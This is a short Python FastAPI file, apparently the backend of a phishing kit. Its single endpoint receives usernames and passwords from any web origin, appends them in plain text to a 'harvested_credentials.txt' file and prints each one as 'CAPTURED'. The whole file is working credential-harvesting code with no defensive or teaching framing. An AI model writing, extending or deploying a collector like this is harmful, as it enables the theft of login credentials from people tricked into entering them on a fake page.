from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

# Allow your frontend to talk to this backend
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.post("/api/capture")
async def capture_credentials(request: Request):
    data = await request.json()
    username = data.get("username")
    password = data.get("password")
    
    # Save the harvested credentials to a text file locally
    with open("harvested_credentials.txt", "a") as f:
        f.write(f"Username: {username} | Password: {password}\n")
    
    print(f"[+] CAPTURED -> Username: {username} | Password: {password}")
    return {"status": "success"}